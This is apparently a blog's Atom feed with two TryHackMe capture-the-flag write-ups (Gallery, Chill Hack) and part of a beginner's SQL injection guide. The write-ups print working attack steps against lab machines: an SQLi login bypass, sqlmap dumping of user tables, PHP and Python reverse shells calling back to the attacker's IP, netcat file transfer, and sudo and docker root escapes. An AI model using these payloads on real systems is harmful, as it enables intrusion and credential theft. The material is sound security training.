<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-10T17:04:55+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>

<p><br /></p>

<h2 id="1-deploy-and-get-a-shell">1. Deploy and get a Shell</h2>

<p>Our gallery is not very well secured.</p>

<p>Designed and created by <a href="https://twitter.com/mika_sec">Mikaa</a>!</p>

<p><br /></p>

<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.177
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <code class="language-plaintext highlighter-rouge">80/tcp HTTP, 8080/tcp HTTP</code></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : 2</code></strong></p>

<p><br /></p>

<h3 id="12-whats-the-name-of-the-cms">1.2 What’s the name of the CMS?</h3>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>An <code class="language-plaintext highlighter-rouge">Apache2 default</code> page appears.</p>

<p>Let’s look at the websie runining on <code class="language-plaintext highlighter-rouge">8080/tcp</code> port.</p>

<p>A login page appears.</p>

<p><img src="/assets/img/tryhackme/gallery/login.png" alt="login" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : Simple Image Gallery</code></strong></p>

<p><br /></p>

<h3 id="13-whats-the-hash-password-of-the-admin-user">1.3 What’s the hash password of the admin user?</h3>

<p>The Website is using <code class="language-plaintext highlighter-rouge">Simple image gallery</code>. I’m looking to see if I can find anything in <a href="https://www.exploit-db.com">exploit-db</a>.</p>

<p>I found four results in <code class="language-plaintext highlighter-rouge">exploit-db</code>.</p>

<p>I’m going through the first and second results, separately.</p>

<p>First <a href="https://www.exploit-db.com/exploits/50214">Simple Image Gallery 1.0 - Remote Code Execution</a></p>

<p><img src="/assets/img/tryhackme/gallery/rce1.png" alt="rce1" /></p>

<p>I tried downloading and running the exploit first, but it didn’t work.</p>

<p>When I looked through the code, I saw this.</p>

<p><img src="/assets/img/tryhackme/gallery/rce2.png" alt="rce2" /></p>

<p>It seems we can access the admin login with SQLi.</p>

<p>We need to write this to the username; <code class="language-plaintext highlighter-rouge">admin' or '1'='1'#</code></p>

<p>Let’s try.</p>

<p><img src="/assets/img/tryhackme/gallery/rce3.png" alt="rce3" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/home.png" alt="home" /></p>

<p>We were able to log in to the site as an admin. I’ve been browsing the site for a bit, let’s see what I can find.</p>

<p>It seems we can upload files. Maybe we can upload a reverse shell.</p>

<p>But first, I want to examine the other page in exploit-db.
<a href="https://www.exploit-db.com/exploits/50198">Simple Image Gallery System 1.0 - ‘id’ SQL Injection</a></p>

<p><img src="/assets/img/tryhackme/gallery/sql1.png" alt="sql1" /></p>

<p>The page explains what to do.</p>

<p><img src="/assets/img/tryhackme/gallery/sql2.png" alt="sql2" /></p>

<p>We need to capture the request for a picture with Burp Suite.
Right click &gt; Save item and we need to save the request and run it in sqlmap.</p>

<p>Let ‘s do it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r text.req --dbs
</code></pre></div></div>

<p>There are <code class="language-plaintext highlighter-rouge">Boolean Based</code> and <code class="language-plaintext highlighter-rouge">Time Based</code> vulnerabilities of SQLi types on the site.</p>

<p><img src="/assets/img/tryhackme/gallery/kind.png" alt="kind" /></p>

<p>With the <code class="language-plaintext highlighter-rouge">--dbs</code> tag, sqlmap will give us the database names.</p>

<p><img src="/assets/img/tryhackme/gallery/databases.png" alt="databases" /></p>

<p>Now that we know the database names, let’s get the tables.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D &lt;database-name&gt; --tables 
</code></pre></div></div>

<p>I dumped the tables for <code class="language-plaintext highlighter-rouge">gallery_db</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/tables.png" alt="tables" /></p>

<p>Now I will empty the columns of the <code class="language-plaintext highlighter-rouge">users</code> table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users --columns
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/columns.png" alt="columns" /></p>

<p>Now let’s dump the <code class="language-plaintext highlighter-rouge">id, username, firstname, and password</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -r test.req -D gallery_db -T users -C id,username,firstname,password --dump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/dump.png" alt="dump" /></p>

<p><br /></p>

<h3 id="14-whats-the-user-flag">1.4 What’s the user flag?</h3>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.35.177/gallery/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/gobuster.png" alt="gobuster" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/uploads</code> directory caught my attention. Maybe I can run the <code class="language-plaintext highlighter-rouge">reverse shell</code> that I will upload from this directory.</p>

<p>Let’s try.</p>

<p>First, go to albums, then create a new album, then you can upload files from inside the album.</p>

<p>Let’s create and upload our reverse shell. <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Pentestmonkey’s PHP Reverse Shell</a></p>

<p><img src="/assets/img/tryhackme/gallery/upload.png" alt="upload" /></p>

<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Now let’s go to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory and find the file we uploaded.</p>

<p><img src="/assets/img/tryhackme/gallery/shell.png" alt="shell" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/in.png" alt="in" /></p>

<p>I see two folders named <code class="language-plaintext highlighter-rouge">mike</code> and <code class="language-plaintext highlighter-rouge">ubuntu</code> in my <code class="language-plaintext highlighter-rouge">/home</code> directory.</p>

<p><img src="/assets/img/tryhackme/gallery/users.png" alt="users" /></p>

<p>We need Mike’s password for <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>

<p><img src="/assets/img/tryhackme/gallery/denied.png" alt="denied" /></p>

<p>I didn’t know what to do and decided to run <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md">linpeas.sh</a> on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/mikepass.png" alt="mikepass" /></p>

<p>We found a password as you can see in the picture, but I don’t know who it belongs to.</p>

<p>Let’s try it for Mike.</p>

<p><img src="/assets/img/tryhackme/gallery/sumike.png" alt="sumike" /></p>

<p>And it worked. If you get an error, run the following codes on the target machine.</p>

<p><img src="/assets/img/tryhackme/gallery/term.png" alt="term" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
$ stty raw -echo;fg
$ reset
$ xterm
</code></pre></div></div>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/gallery/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2--escalate-to-the-root-user">2.  Escalate to the root user</h2>

<p>Good luck with the last step !</p>

<p><br /></p>

<h3 id="21-whats-the-root-flag">2.1 What’s the root flag?</h3>

<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>

<p><img src="/assets/img/tryhackme/gallery/sudol.png" alt="sudol" /></p>

<p>It seems we can run <code class="language-plaintext highlighter-rouge">rootkit.sh</code> with root privileges without requiring a password.</p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/gallery/rootkit.png" alt="rootkit" /></p>

<p>This means that we can use the <code class="language-plaintext highlighter-rouge">nano</code> to get root.</p>

<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> to see if I can find anything about nano.</p>

<p>Let’s try this.</p>

<p><img src="/assets/img/tryhackme/gallery/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export TERM=xterm
$ sudo /bin/bash /opt/rootkit.sh
$ read
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/opt.png" alt="opt" /></p>

<p>After typing <code class="language-plaintext highlighter-rouge">read</code>, nano will open. Then we will do the following in order:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ^R^X
   reset; sh 1&gt;&amp;0 2&gt;&amp;0
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/execute.png" alt="execute" /></p>

<p>And we are <code class="language-plaintext highlighter-rouge">root</code>. Yes!</p>

<p><img src="/assets/img/tryhackme/gallery/rootin.png" alt="rootin" /></p>

<p>Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/gallery/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Chill Hack</title><link href="http://localhost:4000/tryhackme-chill-hack/" rel="alternate" type="text/html" title="TryHackMe - Chill Hack" /><published>2023-05-09T00:00:00+03:00</published><updated>2023-05-09T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chill-hack</id><content type="html" xml:base="http://localhost:4000/tryhackme-chill-hack/"><![CDATA[<p>Easy level CTF.  Capture the flags and have fun!</p>

<p><br /></p>

<h2 id="1-user-flag">1. User Flag</h2>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.249.219
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">21/tcp FTP, 22/tcp SSH, 80/tcp HTTP</code></p>

<p><img src="/assets/img/tryhackme/chill-hack/ftp.png" alt="ftp" /></p>

<p>It seems we can log in FTP server anonymously.
And there is a file called <code class="language-plaintext highlighter-rouge">note.txt</code> on the server.</p>

<p>Let’s take a look at what’s written inside <code class="language-plaintext highlighter-rouge">note.txt</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/note.png" alt="note" /></p>

<p><em><code class="language-plaintext highlighter-rouge">Anurodh told me that there is some filtering on strings being put in the command -- Apaar</code></em></p>

<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p><img src="/assets/img/tryhackme/chill-hack/home.png" alt="home" /></p>

<p>I’ve been browsing the site but nothing remarkable.</p>

<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.249.219  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/gobuster.png" alt="gobuster" /></p>

<p>We found the <em><code class="language-plaintext highlighter-rouge">/secret</code></em> directory.</p>

<p>Let’s look at this page.</p>

<p>We found a page where we can run commands.</p>

<p>I try to run a few commands but something like this comes up.</p>

<p><img src="/assets/img/tryhackme/chill-hack/alert.png" alt="alert" /></p>

<p>I’m trying to do a reverse shell, but none of the codes I tried worked. Except this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.86.168",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

</code></pre></div></div>

<p>I ran the code like <code class="language-plaintext highlighter-rouge">p\ython</code> instead of python. We are inside now.</p>

<p><img src="/assets/img/tryhackme/chill-hack/in.png" alt="in" /></p>

<p>I found an interesting file in <code class="language-plaintext highlighter-rouge">/var/www</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/ints.png" alt="ints" /></p>

<p>Let’s look at the <code class="language-plaintext highlighter-rouge">/files</code> directory.</p>

<p><img src="/assets/img/tryhackme/chill-hack/files.png" alt="files" /></p>

<p>What’s in these files? Let’s look.</p>

<p><strong><code class="language-plaintext highlighter-rouge">account.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/account.png" alt="account" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">hacker.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/hacker.png" alt="hacker" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">index.php</code></strong></p>

<p><img src="/assets/img/tryhackme/chill-hack/index.png" alt="index" /></p>

<p>We found important things in the index.php file.</p>

<p><code class="language-plaintext highlighter-rouge">Mysql - Database: webportal</code>, <code class="language-plaintext highlighter-rouge">root:*************</code></p>

<p>Let’s see if we can log in to <code class="language-plaintext highlighter-rouge">MySQL</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mysql -u root -p 
$ show databases;
$ use webportal
$ show tables;
$ select * from users;
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/mysql.png" alt="mysql" /></p>

<p>We find the encrypted version of the passwords of Anurodh and Apaar.</p>

<p>Let’s look at the type of passwords.</p>

<p><img src="/assets/img/tryhackme/chill-hack/id.png" alt="id" /></p>

<p>It seems passwords are encoded using md5. Let’s crack these passwords.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Anurodh</code></strong>;</p>

<p><img src="/assets/img/tryhackme/chill-hack/crack1.png" alt="crack1" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Apaar</code></strong>;</p>

<p><img src="/assets/img/tryhackme/chill-hack/crack2.png" alt="crack2" /></p>

<p>I try these passwords for ssh login. But it’s not working.</p>

<p>So let’s back the <code class="language-plaintext highlighter-rouge">hacker.php</code>. Firstly, we must download the <code class="language-plaintext highlighter-rouge">hacker-with-laptop_23-2147985341.jpg</code> file.</p>

<p>In my machine;</p>

<p><img src="/assets/img/tryhackme/chill-hack/mine.png" alt="mine" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 &gt; hacker-with-laptop_23-2147985341.jpg
</code></pre></div></div>

<p>In target machine;</p>

<p><img src="/assets/img/tryhackme/chill-hack/target.png" alt="target" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc my-ip 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg
</code></pre></div></div>

<p>We get the file. Now, need to use <code class="language-plaintext highlighter-rouge">steghide</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
$ zip2john backup.zip &gt; hash.hash
$ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/chill-hack/steghide.png" alt="steghide" /></p>

<p>Now that we’ve found the password, let’s see what’s inside the <code class="language-plaintext highlighter-rouge">backup.zip</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/zip.png" alt="zip" /></p>

<p>We found Anurodh’s password in <code class="language-plaintext highlighter-rouge">source_code.php</code>.</p>

<p><img src="/assets/img/tryhackme/chill-hack/encode.png" alt="encode" /></p>

<p>Let’s decode.</p>

<p><img src="/assets/img/tryhackme/chill-hack/decode.png" alt="decode" /></p>

<p>Now, we can access Anurodh’s ssh.</p>

<p><img src="/assets/img/tryhackme/chill-hack/ssh.png" alt="ssh" /></p>

<p>I try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command and it works.</p>

<p><img src="/assets/img/tryhackme/chill-hack/sudol.png" alt="sudol" /></p>

<p>We have a bash file for Apaar that we can run without requiring a password.</p>

<p>Let’s see what’s in it.</p>

<p><img src="/assets/img/tryhackme/chill-hack/writein.png" alt="writein" /></p>

<p>Let’s run the file and try adding <code class="language-plaintext highlighter-rouge">/bin/bash</code> to it.</p>

<p><img src="/assets/img/tryhackme/chill-hack/helpline.png" alt="helpline" /></p>

<p>Yeah, it’s work. Now we can access Apaar.</p>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/chill-hack/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="2-root-flag">2. Root Flag</h3>

<p>Now, we must return back to Anurodh.</p>

<p>I found this and it’s interesting.</p>

<p><img src="/assets/img/tryhackme/chill-hack/docker.png" alt="docker" /></p>

<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about Docker.</p>

<p>Let’s try this code.</p>

<p><img src="/assets/img/tryhackme/chill-hack/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre></div></div>

<p>And we are root. Yes!</p>

<p><img src="/assets/img/tryhackme/chill-hack/rootin.png" alt="rootin" /></p>

<p>Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/chill-hack/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="command-injection, sql-injection, real-world" /><summary type="html"><![CDATA[Easy level CTF. Capture the flags and have fun!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chill-hack.png" /><media:content medium="image" url="http://localhost:4000/assets/img/chill-hack.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SQL Injection Guide</title><link href="http://localhost:4000/sql-injection-guide/" rel="alternate" type="text/html" title="SQL Injection Guide" /><published>2023-05-06T00:00:00+03:00</published><updated>2023-05-06T00:00:00+03:00</updated><id>http://localhost:4000/sql-injection-guide</id><content type="html" xml:base="http://localhost:4000/sql-injection-guide/"><![CDATA[<p>In this article, I intended to explain SQL injection in the most basic and most easily understandable way. Because the resources, I tried to learn were often too detailed for the beginner level and not very clear for the beginner level.  So, I preferred a shorter and clearer explanation.</p>

<p>But it would not be right for me to give only the basic information in my article. I want you to understand the basics, and let the SQL injection fit your logic. So, there are many <a href="#sources">resources</a> that I have shared in this article, check them out. There are many <a href="#labs">labs</a> where you can practice your knowledge. I also shared a lot of <a href="#chs">cheat sheets</a> as a helper.</p>

<p>I hope the article is useful to you. It helps you to learn SQL injection :worried:</p>

<h3 id="topics">Topics</h3>

<ul>
  <li><a href="#bft">Basic First</a> <br /></li>
  <li><a href="#sit">SQL Injection and Types</a> <br /></li>
  <li><a href="#labs">SQL Injection Labs</a> <br /></li>
  <li><a href="#sources">SQL Injection Sources</a> <br /></li>
  <li><a href="#chs">SQL Injection Cheat Sheats</a> <br /></li>
</ul>

<p><br /></p>

<p><img src="/assets/video/sqli-guide/sqli-attack.png" alt="sqli" /></p>

<h3 id="bft">Basic First</h3>

<h3 id="what-is-a-database">What is a Database?</h3>

<p>A <code class="language-plaintext highlighter-rouge">database</code> is where all kinds of data and information are stored electronically.</p>

<h3 id="what-is-database-management-system-dbms">What is Database Management System (DBMS)?</h3>

<p>The database is usually controlled by a <code class="language-plaintext highlighter-rouge">Database Management System (DBMS)</code>. Thanks to this system, data can be easily accessed, managed, changed, updated, and organized.</p>

<p>Most databases today use <code class="language-plaintext highlighter-rouge">SQL</code>.</p>

<h3 id="what-is-sql">What is SQL?</h3>

<p><code class="language-plaintext highlighter-rouge">SQL</code> is a programming language used in databases to query, manipulate and define data, as well as to provide access control.</p>

<p><br /></p>

<h3 id="sit">SQL Injection and Types</h3>

<p>A web application sends SQL queries to use data found in the database. The attacker can inject their own queries into these SQL queries or manipulate the queries. In this case, it can access other information stored in the database. We call this situation the <code class="language-plaintext highlighter-rouge">SQL Injection</code> vulnerability.</p>

<p>A successful <code class="language-plaintext highlighter-rouge">SQL injection</code> attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.  In some cases, an attacker can obtain a persistent backdoor into an organization’s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>

<p><br /></p>
<h3 id="error-based-sqli">Error-Based SQLi</h3>

<p>An error is received in response to submitted SQL queries. The attacker can also send new queries according to this error, or by manipulating the error, he can reach the information he wants to reach from within the output.</p>

<p><br /></p>
<h3 id="union-based-sqli">Union-Based SQLi</h3>

<p>Multiple <code class="language-plaintext highlighter-rouge">Select</code> queries can be written using the <code class="language-plaintext highlighter-rouge">Union</code> operator. In this case, the attacker can write his own SELECT query with a union operator. But it should be noted that when the union expression is used, the <code class="language-plaintext highlighter-rouge">number of columns must be equal</code> to each other.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Union-Based-SQLi.mp4" type="video/mp4" />
</video>

<p><br /></p>

<h3 id="boolean-based-sqli">Boolean-Based SQLi</h3>

<p>It does not return an error or requested information in response to submitted SQL queries. Instead, it gives a <code class="language-plaintext highlighter-rouge">true or false</code> answer. This makes the process very long.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Boolean-Based-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="time-based-sqli">Time-Based SQLi</h3>

<p>It doesn’t return anything in response to submitted SQL queries. However, the attacker tries to see if the query works by adding functions such as <code class="language-plaintext highlighter-rouge">sleep()</code> to these SQL queries.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Time-Based-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="out-of-ban-sqli">Out-of-Ban SQLi</h3>

<p>None of the techniques described so far will work. The application’s response doesn’t depend on whether the query returns any data, on whether a database error occurs or on the time taken to execute the query. In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions with a system that you control. These can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.</p>

<p>Various network protocols can be used for this purpose, but typically the most effective is DNS.</p>

<video width="640" height="360" controls="">
  <source src="/assets/video/sqli-guide/Out-of-Band-SQLi.mp4" type="video/mp4" />
</video>
<p><br /></p>

<h3 id="warning">Warning</h3>

<p>Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you’re injecting into, it’s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p>

<p><br /></p>

<h3 id="labs">SQL Injection Labs</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/all-labs">Web Security Academy - All Labs</a></li>
  <li><a href="https://tryhackme.com/room/sqlilab">TryHackMe - SQL Injection Lab</a></li>
  <li><a href="https://tryhackme.com/room/owaspjuiceshop">TryHackMe - OWASP Juice Shop</a></li>
  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
  <li><a href="https://tryhackme.com/room/sqlmap">TryHackMe - Sqlmap</a></li>
  <li><a href="https://tryhackme.com/room/gamezone">TryHackMe - Game Zone</a></li>
  <li><a href="https://tryhackme.com/room/poster">TryHackMe - Poster</a></li>
  <li><a href="https://tryhackme.com/room/chillhack">TryHackMe - Chill Hack</a> - <a href="https://mr0wido.github.io/tryhackme-chill-hack/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/gallery666">TryHackMe - Gallery</a></li>
  <li><a href="https://tryhackme.com/room/avengers">TryHackMe - Avengers Blog</a></li>
  <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a></li>
  <li><a href="https://tryhackme.com/room/wekorra">TryHackMe - Wekor</a></li>
  <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
  <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a></li>
  <li><a href="https://tryhackme.com/room/olympusroom">TryHackMe - Olympus</a></li>
  <li><a href="https://tryhackme.com/room/revenge">TryHackMe - Revenge</a></li>
  <li><a href="https://tryhackme.com/room/metamorphosis">TryHackMe - Metamorphosis</a></li>
  <li><a href="https://tryhackme.com/room/wwbuddy">TryHackMe - WWBuddy</a></li>
  <li><a href="https://tryhackme.com/room/unstabletwin">TryHackMe - Unstable Twin</a></li>
  <li><a href="https://tryhackme.com/room/dailybugle">TryHackMe - Daily Bugle</a> - <a href="https://mr0wido.github.io/tryhackme-daily-bugle/">My Writeup :punch:</a></li>
  <li><a href="https://tryhackme.com/room/yearofthedog">TryHackMe - Year of the Dog</a></li>
  <li><a href="https://tryhackme.com/room/yearofthepig">TryHackMe - Year of the Pig</a></li>
  <li><a href="https://tryhackme.com/room/m4tr1xexitdenied">TryHackMe - M4tr1x: Exit Denied</a></li>
  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">PentesterLab - From SQL Injection to Shell</a></li>
  <li><a href="https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course">PentesterLab - From SQL Injection to Shell: PostgreSQL Edition</a></li>
  <li><a href="https://ctflearn.com/challenge/88">CTFLearn - Basic Injection</a></li>
  <li><a href="https://ctflearn.com/challenge/149">CTFLearn - Inj3ction Time</a></li>
</ul>

<p><br /></p>

<h3 id="sources">SQL Injection Sources</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy - SQL injection</a></li>
  <li><a href="https://tryhackme.com/room/sqlinjectionlm">TryHackMe - SQL Injection</a></li>
  <li><a href="https://www.hackerrank.com/domains/sql">HackerRank - SQL</a></li>
  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP - SQL Injection</a></li>
  <li><a href="https://systemweakness.com/handbook-for-sql-injection-2c12ec29d7ee">Niveet Palan - Handbook for SQL Injection</a></li>
  <li><a href="https://thegrayarea.tech/p1-bug-hunting-a-step-by-step-guide-to-sql-injection-76f95c8986b0">Graham Zemel - Step by Step Guide to SQL Injection</a></li>
  <li><a href="https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/">Raj Chandel’s Blog - Manual SQL Injection Exploitation Step by Step</a></li>
  <li><a href="https://infosecwriteups.com/a-technique-that-a-lot-of-sql-injection-beginners-dont-know-atmanand-nagpure-write-up-abdc7c269dd5">Atmanand Nagpure - A technique that a lot of SQL injection beginners don’t know</a></li>
  <li><a href="https://infosecwriteups.com/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5">goswamiijaya - Identifying &amp; Exploiting SQL Injections: Manual &amp; Automated</a></li>
  <li><a href="https://github.com/daffainfo/AllAboutBugBounty/blob/master/SQL%20Injection.md">daffainfo - SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/definitive-guide-to-sql-injection-df5ac445eef1">Security Lit Limited - Definitive Guide to SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94">goswamiijaya - Exploiting Error Based SQL Injections &amp; Bypassing Restrictions</a></li>
  <li><a href="https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b">Lee Chun How - Out-of-Band (OOB) SQL Injection</a></li>
  <li><a href="https://infosecwriteups.com/first-steps-to-sql-injection-45fc0d9aae21">Mcry - First step to an SQL-Injection</a></li>
  <li><a href="https://infosecwriteups.com/sql-injection-an-overview-1057c5729dc5">Secpy Community - SQL Injection: An Overview</a></li>
  <li><a href="https://infosecwriteups.com/what-is-sql-injection-6985c298ea20">Frost - What is SQL Injection and How Does it Work</a></li>
  <li><a href="https://application.security/free-application-security-training/owasp-top-10-sql-injection">Kontra Application Security - SQL Injection</a></li>
  <li><a href="https://www.hacksplaining.com/exercises/sql-injection#/start">Start - SQL Injections</a></li>
  <li><a href="https://ctflearn.com/lab/SQL-Injection-Part-1">CTFlearn - SQL Injection</a></li>
  <li><a href="https://www.imperva.com/learn/application-security/sql-injection-sqli/">Imperva - What is SQL Injection</a></li>
